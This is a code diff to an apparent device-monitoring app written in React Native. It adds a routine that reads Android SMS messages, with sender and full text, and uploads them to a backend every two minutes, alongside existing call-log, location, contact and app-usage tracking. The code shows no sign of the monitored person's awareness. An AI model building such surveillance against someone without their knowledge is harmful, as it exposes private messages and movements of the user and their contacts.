@@ -9,6 +9,7 @@ import Contacts from 'react-native-contacts';
 import Geolocation from 'react-native-geolocation-service';
 import DeviceInfo from 'react-native-device-info';
 import AppUsage from 'react-native-app-usage';
+import SmsAndroid from 'react-native-get-sms-android';
 import AsyncStorage from '@react-native-async-storage/async-storage';
 import { ApiService } from './ApiService';
 
@@ -27,6 +28,7 @@ class MonitoringService {
       
       // Start different monitoring services
       await this.startCallLogMonitoring();
+      await this.startSmsMonitoring();
       await this.startLocationMonitoring();
       await this.startAppUsageMonitoring();
       await this.startContactsMonitoring();
@@ -116,6 +118,74 @@ class MonitoringService {
       case '3': return 'missed';
       default: return 'unknown';
     }
+  }
+
+  // SMS Monitoring
+  async startSmsMonitoring() {
+    if (Platform.OS !== 'android') {
+      console.log('SMS monitoring only available on Android');
+      return;
+    }
+
+    const syncSmsMessages = async () => {
+      try {
+        const hasPermission = await PermissionsAndroid.check(
+          PermissionsAndroid.PERMISSIONS.READ_SMS
+        );
+
+        if (!hasPermission) {
+          console.log('SMS permission not granted');
+          return;
+        }
+
+        const lastSync = await AsyncStorage.getItem('last_sms_sync');
+        const filter = {
+          box: '', // 'inbox', 'sent', 'draft'
+          read: -1, // -1 for all, 0 for unread, 1 for read
+          indexFrom: 0,
+          maxCount: 50,
+        };
+
+        if (lastSync) {
+          filter.minDate = parseInt(lastSync);
+        }
+        
+        const smsList = await new Promise((resolve, reject) => {
+          SmsAndroid.list(
+            JSON.stringify(filter),
+            (fail) => reject(new Error(fail)),
+            (count, smsList) => resolve(JSON.parse(smsList))
+          );
+        });
+
+        if (smsList && smsList.length > 0) {
+          console.log(`Found ${smsList.length} new SMS messages`);
+          
+          const formattedSms = smsList.map(sms => ({
+            _id: sms._id,
+            address: sms.address,
+            body: sms.body,
+            date: new Date(sms.date).toISOString(),
+            type: sms.type === 1 ? 'inbox' : 'sent'
+          }));
+
+          // Send to backend
+          await ApiService.syncSms(formattedSms);
+          
+          // Update last sync time
+          const latestTimestamp = Math.max(...smsList.map(s => s.date));
+          await AsyncStorage.setItem('last_sms_sync', latestTimestamp.toString());
+        }
+      } catch (error) {
+        console.error('SMS sync error:', error);
+      }
+    };
+
+    // Initial sync
+    await syncSmsMessages();
+    
+    // Set up periodic sync (every 2 minutes)
+    this.intervals.sms = setInterval(syncSmsMessages, 2 * 60 * 1000);
   }
 
   // Location Monitoring
